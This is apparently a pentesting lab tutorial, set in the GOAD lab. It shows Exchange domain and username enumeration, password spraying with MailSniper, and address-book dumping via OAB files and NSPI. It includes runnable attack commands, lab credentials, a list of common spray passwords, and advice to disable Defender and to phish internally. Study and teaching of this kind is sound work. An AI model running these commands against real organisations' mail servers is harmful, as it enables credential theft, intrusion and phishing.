---
title: "Exchange Enumeration & Password Spraying"
toc: true
toc_label: "Table of Contents"
toc_icon: "folder-open"
toc_sticky: true
category: GOAD
tags: GOAD AD Guide Exchange Spraying
excerpt: "This is my notes and extrapolated information for gaining a foothold on a domain via Exchange using Enumeration and Password Spraying"
header:
  teaser: "/assets/images/Exchange-Installation-Images/Exchange-Server-2019.jpg"
---


This is the first section in the series covering the book Pentesting Active Directory and Windows-Based Infrastructure by Denis Isakov

Some sections of this post are direct snips from the book, some are condensed and paraphrased and the rest are my own words put into practice and explained. 

I highly recommend any reader to pickup a copy of this book and use as a reference where possible.

# Autodiscover

Exchange allows remote access via protocols such as **Exchange Web Services (EWS)**, **Exchange ActiveSync (EAS)**, Outlook Anywhere, and MAPI over HTTP.

The Autodiscover service helps retrieve Exchange configuration, mailbox settings, supported protocols and service URLs, you can find this information in the `autodiscover.xml` in the Autodiscover directory.

**Outlook Web Application (OWA)** is a web-based email client. This client can be accessed with just a browser without Outlook being installed.

The **Global Address List (GAL)** is a list of every mail-enabled object in an Active Directory forest.

# User Enumeration and Password Spraying

## Step 1: Email Formatting

First we need to do some OSINT to discover email address formatting and potential users.

There are several tools and techniques that can be used, such as Google Dorking, Social Media scraping, Website Enumeration or DNS recon.


[Hunter.io](https://hunter.io) can be helpful in finding out a companies email address formatting for example:

```
Firstname.Lastname@Company.tld
FirstInitialLastname@Company.tld
Lastname.Firstname@Company.tld
GenericMail@Company.tld
```

There are some useful tools that can help with creating these lists such as [namemash](https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py) and/or [EmailAddressMangler](https://github.com/dafthack/EmailAddressMangler), now that we have a list of potential usernames we need to validate them.

## Step 2: Domain Name Enumeration

The next thing we need to do is to uncover the Internal Domain Name, the best tool to use for most things Exchange related is [MailSniper](https://github.com/dafthack/MailSniper)

The `DomainHarvestOWA` function uses two methods to potentially reveal the internal domain name.

The first method extracts the name from the `WWW-Authenticate` header that is returned when a request is sent to `https://mail.target.tld/autodiscover/autodiscover.xml` and `https://mail.target.tld/EWS/Exchange.asmx`.

The second method uses brute force by using a supplied domain name list. Requests will be sent to `https://mail.target.tld/owa` and a response time will be calculated, as a request with an invalid domain name will have a much shorter response time.

Lets target our new [[1 - Exchange Extension Installation|Exchange Server]] in GoAD and use `Invoke-DomainHarvestOWA`

### Loading mailsniper

```powershell
powershell -ep bypass
```

```powershell
. .\MailSniper.ps1
```

### Enumerating the domain

```powershell
Invoke-DomainHarvestOWA -ExchHostname 192.168.56.21
```

{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/invoke-domainharvest.png" alt="domain-harvest"%}{: .align-center}

```
The domain appears to be: SEVENKINGDOMS or &sevenkingdoms.local
```

## Step 3: User Enumeration

Now that we have the domain name `sevenkingdoms.local` we will need to find valid user names.

To make things easier than grabbing all of the game of thrones characters from the internet, i decided to pull them from the main GoAD config file using a dodgy bash command.

```bash
cat ../../ad/GOAD/data/config.json | grep -E "firstname|surname" | cut -d ':' -f 2 | tr -d '"' | tr -d ',' | paste - - | tr -d '\t' | awk '{$1=$1};1' > chars.txt
```

And added the new users from the exchange module too

```bash
cat ../../extensions/exchange/data/config.json | grep -E "firstname|surname" | cut -d ':' -f 2 | tr -d '"' | tr -d ',' | paste - - | tr -d '\t' | awk '{$1=$1};1' >> chars.txt
```

Now we have a list of character names, we need them in a suitable format, thats where namemash comes back in.

I used PowerShell to get the `namemash.py` file and then WSL to run it against the list i made

```powershell
wget https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py -OutFile namemash.py   
```

For the sake of running the character list through namemash I will remove the following names (as they have  `-` as the surname) and save the file as `chars2.txt` to preserve the original list.

```
missandei -
drogon -
```

From WSL I ran the following:

```bash
python3 namemash.py chars2.txt > mashed.txt
```

Giving me a nice list of potential email address formats:

```
---tr---
v.targaryen
t.viserys
viserys
targaryen
khaldrogo
drogokhal
khal.drogo
drogo.khal
drogok
kdrogo
dkhal
k.drogo
d.khal
---tr---
```

Now I can use the new `mashed.txt` with mailsniper to test the exchange usernames

```powershell
Invoke-UsernameHarvestOWA -UserList .\mashed.txt -ExchHostname 192.168.56.21 -Domain sevenkingdoms.local -OutFile .\Valid-Email.txt
```

{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/valid-emails.png" alt="valid-emails"%}{: .align-center}

After allowing the tool to run though we have 9 potential usernames printed to `.\Valid-Email.txt`

```
sevenkingdoms.local\renly.baratheon
sevenkingdoms.local\stannis.baratheon
sevenkingdoms.local\petyer.baelish
sevenkingdoms.local\lord.varys
sevenkingdoms.local\maester.pycelle
sevenkingdoms.local\lysa.arryn
sevenkingdoms.local\robin.arryn
sevenkingdoms.local\robert.baratheon
sevenkingdoms.local\joffrey.baratheon
```

## Step 4: Password Spraying


{: .notice--danger} 
>**MFA!**  
>It is important to note that recovering credentials in this way will not grant access if MFA is enabled.
>
>MFA can be bypassed but requires further social engineering or misconfigurations to be present.


For this step we will again be using MailSniper, in this example we are somewhat cheating again because we already know the passwords of the users from the `config.json` file we used earlier.

However the methodoligy remails the same, we will be spraying a password across the potential usernames discovered, and hopefully the password will stick

In the real world you will want to try simple passwords such as:

```
Password1
Password123
Password123!
Spring2025!
Spring2025
Football
Footballteamname123
```

In this instance we will be using a know password from the `config.json` file.

```
iamthekingoftheworld
```

{: .notice--warning} 
>**Real-Time Protection**  
>To run the password spraying element of `mailsniper` i had to disable the Real-Time Protection element of Windows Defender, An AMSI bypass could be used on the local system to prevent this, but seeing as its your own machine a temporary pause is quicker.

```powershell
Invoke-PasswordSprayOWA -UserList .\Valid-Email.txt -ExchHostname 192.168.56.21 -Password 'iamthekingoftheworld' -Outfile Creds.txt
```

{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/found-credentials.png" alt="found-credentials"%}{: .align-center}

```
sevenkingdoms.local\robert.baratheon:iamthekingoftheworld
```

Great, we have a set of valid credentials, you can confirm this by logging in to OWA on the lab

```
https://192.168.56.21/owa
```

# Dumping and Exfiltrating

{: .notice--warning}
>**Things to Consider**  
>It's important to note that when on an engagement you do not go out of the bounds of the agreed upon scope.
>Reading through emails could lead to uncovering personal information and may breach some laws such as `GDPR` if not careful.

## 1. Read the Emails

You could find valuable information in here such as usernames, passwords, sensitive directories, scripts, certificates or just about anything that could be leveraged to allow you to gain a further foothold on the network.

## 2. Internal Phishing

It is very common for internal emailing rules to be more lax than the rules applied to external emails, as such it may be possible to perform a more targeted and successful phishing campaign from within the confines of the targets domain.

## 3. Extracting More Addresses

### Get-GlobalAddressList

As always once you have gained further access into something the next step is to start the enumeration phase again.

In this instance it is possible to extract the `Global Address List`, this list is the entire global list of all addresses in the Active Directory without disclosing the mailbox content.

Mailsniper has a module that allows us to utilize the `FindPeople` method and collect all the addresses, this method has been available since Exchange 2013 and requires the `AddressListId` value from the `GetPeopleFilters` URL.

We will be using the `Get-GlobalAddressList` module along with the credentials recovered earlier.

```powershell
Get-GlobalAddressList -ExchHostname 192.168.56.21 -UserName 'sevenkingdoms.local\robert.baratheon' -Password 'iamthekingoftheworld' -OutFile gal.txt
```
{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/get-globaladdresslist.png" alt="get-globaladdresslist"%}{: .align-center}

We can now use this list to perform more Password Spraying, or Internal Phishing and so on.

### OAB files

{: .notice--info} 
>It is important to note that an email address of an existing user is required as well as any valid domain account.

Another way to dump the email addresses of all Exchange users is to download OAB files.

The steps are as follows:

1. Issue web request to the `autodiscover` endpoint and retrieve `autodiscover.xml`.
2. Search for `OABUrl` value in the response, which is a path to the directory with OAB files. Do not miss other useful information such as the domain user's SID and domain controller name.
3. Request `oab.xml` by using the `OABUrl` value to list OAB filenames.
4. In `oab.xml` search for a filename that includes `data` and has the `.lzx` extension.
5. Download the file and parse it.

Get `OABUrl` from autodiscover:

```bash
curl -k --ntlm -u 'sevenkingdoms.local\robert.baratheon:iamthekingoftheworld' https://192.168.56.21/autodiscover/autodiscover.xml > autodiscover.xml
```

Extract `oab.xml` file which contains records

```bash
curl -k --ntlm -u '<domain>\<user>:<password>' https://<domain>/OAB/<OABUrl>/oab.xml > oab.xml

cat oab.xml | grep '.lzx' | grep data
```

Extract `.lzx` compressed file

```bash
curl -k --ntlm -u '<domain>\<user>:<password>' https://<domain>/OAB/<OABUrl>/<OABId-data-1>.lzx > oab.lzx

strings oab.lzx | egrep -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,5}" | sort -u > emails.txt
```
There is a handy Python tool called [oaburl.py](https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438) that automates the aquisition of the `oab.xml`:

```bash
./oaburl.py <domain>/<user>:'<password>'@<serverIP> -e valid@domain.com
```

```bash
python3 ./oaburl.py sevenkingdoms.local/robert.baratheon:'iamthekingoftheworld'@192.168.56.21 -e robert.baratheon@sevenkingdoms.local
```


```bash
[*] Authenticated users's SID (X-BackEndCookie): S-1-5-21-2722481951-2168393988-524039136-1117
[+] DisplayName: robert.baratheon
[+] Server: f71190cd-e42f-4d15-8281-69f2d75735c5@sevenkingdoms.local
[+] AD: kingslanding.sevenkingdoms.local
[+] OABUrl: https://the-eyrie.sevenkingdoms.local/OAB/fbdfa4d5-7c0c-4b91-9f29-32b183633115/
```

We can now see that the valid OABUrl is:

```
https://the-eyrie.sevenkingdoms.local/OAB/fbdfa4d5-7c0c-4b91-9f29-32b183633115/
```

OABUrl.py will also download the `oab.xml` file to the local directory

{: .notice--info}
> **GoADv3 Exchange**  
> Its worth pointing out that trying to recover the OAB files from GoaDv3 did not work for me. That being said the methodology is still correct and as with any exploitation may or may not work on an individual basis.

Once you have the `oab.xml` file you need to extract the URL for the `.lzx` file with the word `data` in it.

```bash
grep oab.xml | grep '.lzx' | grep data 
```

Find the URL and download the `.lzx` file

```bash
curl -k --ntlm -u '<domain>\<user>:<password>' https://<domain>/OAB/<OABUrl>/<OABId-data-1>.lzx > oab.lzx
```

And manually extract the email addresses

```bash
strings oab.lzx | egrep -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,5}" | sort -u > emails.txt
```

### NSPI

{: .notice--info}
>In this example we are using the user `robin.arryn:mommy` this user is one of the ones that comes with the Exchange extension and seems to work a little better with this module.

Another way to dump an address book is via NSPI, there is an impacket module available `impacket-exchanger`.
First we need to list the tables to get the GUID and then using that GUID, dump other more important tables:

```bash
sudo impacket-exchanger sevenkingdoms/robin.arryn:mommy@192.168.56.21 -debug nspi list-tables -count
```

{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/exchanger-nspi-list.png" alt="exchanger-nspi-list"%}{: .align-center}

The "All Users" table has 26 records, we will extract the information from this table to get what we want.

{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/exchanger-nspi-all-users.png" alt="exchanger-nspi-all-users"%}{: .align-center}

```bash
sudo impacket-exchanger sevenkingdoms/robin.arryn:mommy@192.168.56.21 -debug nspi dump-tables -guid d009b582-a2a9-4223-b592-d3c8f7880aff -lookup-type EXTENDED
```

{% include figure popup=true image_path="/assets/images/Exchange-Enumeration-Images/exchanger-nspi-dump.png" alt="exchanger-nspi-dump"%}{: .align-center}

You can output this all into a file, but the output shows valuable user information, you can later extract information from the file and create an address list if required.

From here, again we can spray more passwords across more confirmed email addresses to gain further footholds.